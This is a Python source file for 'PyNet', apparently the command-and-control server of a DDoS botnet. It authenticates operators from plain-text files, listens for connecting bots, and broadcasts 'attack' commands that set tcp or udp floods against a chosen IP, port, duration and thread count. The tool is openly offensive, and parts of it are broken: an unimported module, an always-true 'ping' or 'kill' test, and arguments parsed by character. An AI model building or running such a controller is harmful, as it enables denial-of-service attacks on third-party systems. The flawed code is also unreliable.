from threading import Thread
import colorama
from colorama import Fore, init
import os
import time
from time import sleep
import ctypes, socket, sys
import platform, signal
from random import choice
from typing import Union, Tuple

os.system('cls')

def print_logo():
	print(f"""{Fore.RESET}
            {Fore.GREEN}oooooooooo             {Fore.RED}oooo   oooo              o8   
            {Fore.GREEN} 888    888 oooo   oooo{Fore.RED} 8888o  88  ooooooooo8 o888oo 
            {Fore.GREEN} 888oooo88   888   888{Fore.RED}  88 888o88 888oooooo8   888   
            {Fore.GREEN} 888          888 888{Fore.RED}   88   8888 888          888   
            {Fore.GREEN}o888o           8888{Fore.RED}   o88o    88   88oooo888   888o 
            {Fore.GREEN}             o8o888                                  {Fore.RESET}  
    """)

def admin_logo():
	print(f"""{Fore.RESET}
            {Fore.MAGENTA}oooooooooo             {Fore.RESET}oooo   oooo              o8   
            {Fore.MAGENTA} 888    888 oooo   oooo{Fore.RESET} 8888o  88  ooooooooo8 o888oo 
            {Fore.MAGENTA} 888oooo88   888   888{Fore.RESET}  88 888o88 888oooooo8   888   
            {Fore.MAGENTA} 888          888 888{Fore.RESET}   88   8888 888          888   
            {Fore.MAGENTA}o888o           8888{Fore.RESET}   o88o    88   88oooo888   888o 
            {Fore.MAGENTA}             o8o888                                  {Fore.RESET}  
    """)

print_logo()

def validate_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(x.isdigit() for x in parts) and all(0 <= int(x) <= 255 for x in parts) and not ipaddress.ip_address(ip).is_private

def find_login(username, password):
	loginfile = open('logins.txt', 'r').read()
	if username in loginfile and password in loginfile:
		if len(username) >= 4 and len(password) >= 4:
			return True
		else:
			return False
	else:
		return False

def find_admin(username, password):
	adminfile = open('admins.txt', 'r').read()
	if username in adminfile and password in adminfile:
		if len(username) >= 4 and len(password) >= 4:
			return True
		else:
			return False
	else:
		return False

username = input(f'{Fore.RED}[PYNET | USERNAME]{Fore.RESET} $ ')
password = input(f'{Fore.RED}[PYNET | PASSWORD]{Fore.RESET} $ ')

if find_login(username, password):
	sleep(1)
	os.system('cls')
else:
	print()
	print(f'{Fore.RED}[PYNET] {Fore.RESET}${Fore.RED} INVALID LOGIN.')
	exit()
	sys.exit()

class Server():
	def __init__(self, connect:Tuple[str,int]=("0.0.0.0",9999)):
		super().__init__()
		signal.signal(signal.SIGINT, self.exit_gracefully)
		signal.signal(signal.SIGTERM, self.exit_gracefully)
		print_logo()
		if find_admin(username, password):
			print(f'''{Fore.RESET}
			   ACCESS  | {Fore.GREEN}ADMIN{Fore.RESET}
			   ACCOUNT | {Fore.GREEN}{username.upper()}
			''')
		else:
			print(f'''{Fore.RESET}
			   ACCESS  | {Fore.GREEN}USER{Fore.RESET}
			   ACCOUNT | {Fore.GREEN}{username.upper()}
			''')
		self.all_connections = []
		self.all_address = []
		self.stop = False
		if self._bind(connect):
			while True:
				self._take_cmd()

	def exit_gracefully(self,signum:Union[str,object]="", frame:Union[str,object]=""):
		print(f"\n \n{Fore.RED}Exiting PyNet...{Fore.RESET}")
		self.stop = True
		self.sock.close()
		sleep(1)
		sys.exit(0)

	def _bind(self, connect:Tuple[str,int]) -> bool:
		self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.sock.bind(connect)
		self.sock.listen(50)
		self.sock.settimeout(0.5)
	
		Thread(target=self.collect).start()
		Thread(target=self.check).start()

		return True
	
	def _print_help(self):
		print(f"""
    {Fore.RED}attack{Fore.RESET} 	      <method> <ip> <port> <mins> <threads>

    {Fore.RED}panel{Fore.RESET} 	      Displays admin panel
    {Fore.RED}methods{Fore.RESET} 	      Displays Methods
    {Fore.RED}ping{Fore.RESET} 	      Check client status
    {Fore.RED}kill{Fore.RESET} 	      Stop all connections
    {Fore.RED}list{Fore.RESET} 	      Show online clients
    {Fore.RED}clear{Fore.RESET} 	      Clear terminal
    {Fore.RED}logout{Fore.RESET} 	      Logout from {username}
    {Fore.RED}exit{Fore.RESET} 	      Exit PyNet
		""")
	def collect(self):
		while not self.stop:
			try:
				conn, address = self.sock.accept()
				self.all_connections.append(conn)
				self.all_address.append(address)
			except socket.timeout:
				continue
			except socket.error:
				continue
			except Exception as e:
				print(f"{Fore.RED}[ERROR]{Fore.RESET} Couldn't Accept Connection(s)")

	def _take_cmd(self):
		cmd=input(f"{Fore.RESET}{Fore.RED}[PYNET]{Fore.RESET} $ {Fore.RED}").strip()

		if cmd:
			if cmd == "list":
				results = ''
				for i, (ip, port) in enumerate(self.all_address):
					i = i + 1
					results = results+(f'    {Fore.RESET}[{Fore.RED}{i}{Fore.RESET}]   {ip}:{port}   {Fore.GREEN}CONNECTED{Fore.RESET}\n')
				print(f"\n            {Fore.RESET}Connected Machines" + "\n \n" + results)
				
			elif cmd == "help":
				self._print_help()

			elif cmd == "logout":
				self.stop = True
				self.sock.close()
				os.system('cls')
				os.system(f'python {__file__}')

			elif cmd == "clear":
				os.system('cls')
				print_logo()
				
			elif cmd == "panel":
				if find_admin(username, password):
					os.system('cls')
					admin_logo()
					print(f'{Fore.RESET}{Fore.MAGENTA}[PYNET]{Fore.RESET} Admin Panel')
					print(f'''
    {Fore.MAGENTA}add <user> <pass>         {Fore.RESET}Adds new user to db
    {Fore.MAGENTA}remove <user> <pass>      {Fore.RESET}Removes user from db
    {Fore.MAGENTA}blacklist <hwid>          {Fore.RESET}Blacklists user by hwid	
    {Fore.MAGENTA}main                      {Fore.RESET}Returns to main menu
					''')
					admincmd=input(f"{Fore.RESET}{Fore.MAGENTA}[PYNET]{Fore.RESET} $ {Fore.MAGENTA}")
					admincmd = admincmd.strip()
					if admincmd == "main":
						os.system('cls')
						print_logo()
					elif admincmd == "blacklist":
						userhwid = admincmd[1]
						print(userhwid)
					else:
						os.system('cls')
						print_logo()
				else:
					print(f"\n {Fore.RED}[ERROR]{Fore.RESET} You don't have Admin Privileges!{Fore.RESET}\n")

			elif cmd == "methods":
				print(f"""
    {Fore.RESET}[{Fore.RED}+{Fore.RESET}]  {Fore.GREEN}tcp 
    {Fore.RESET}[{Fore.RED}+{Fore.RESET}]  {Fore.GREEN}udp{Fore.RESET} 					
				""")
				
			elif cmd == "exit":
				self.exit_gracefully()
				
			elif "attack" in cmd:
				args = cmd.strip()
				ip = args[2]
				for i, (ip, port) in enumerate(self.all_address):
					try:
						self.all_connections[i].send(cmd.encode())
						print(f'\n    {Fore.RESET}[{Fore.RED}+{Fore.RESET}]   STARTED ATTACKING {Fore.RED}{ip}{Fore.RESET} SUCCESSFULLY \n')
					except BrokenPipeError:
						del self.all_address[i]
						del self.all_connections[i]
						print(f'\n    {Fore.RESET}[{Fore.RED}+{Fore.RESET}] ATTACK ERROR\n')
						
			elif cmd == "ping" or "kill":
				for i, (ip, port) in enumerate(self.all_address):
					try:
						self.all_connections[i].send(cmd.encode())
						try:
						    print(f'\n    {Fore.RESET}[{Fore.RED}+{Fore.RESET}]   {ip}:{port}   {Fore.GREEN}{self.all_connections[i].recv(1024*5).decode("ascii")}{Fore.RESET} \n')
						except:
						    print(f'\n    {Fore.RESET}[{Fore.RED}+{Fore.RESET}]   {ip}:{port}   {Fore.RED}DEAD{Fore.RESET} \n')						
					except BrokenPipeError:
						del self.all_address[i]
						del self.all_connections[i]
		else:
			pass

	def check(self, display:bool=False, always:bool=True):
		while not self.stop:
			c=0
			for n,tcp in zip(self.all_address,self.all_connections):
				c+=1
				try:
					tcp.send(str.encode("ping"))
					if tcp.recv(1024).decode("utf-8") and display:
							print(f'[{Fore.RED}+{Fore.RESET}]    {str(n[0])+":"+str(n[1])}    {Fore.GREEN}ALIVE')
				except:
					if display:
						print(f'[{Fore.RED}+{Fore.RESET}]    {str(n[0])+":"+str(n[1])}    {Fore.RED}DEAD')
					del self.all_address[c-1]
					del self.all_connections[c-1]
					continue
			if not always:
				break
			
			sleep(0.5)

if __name__ == '__main__':
	Server()
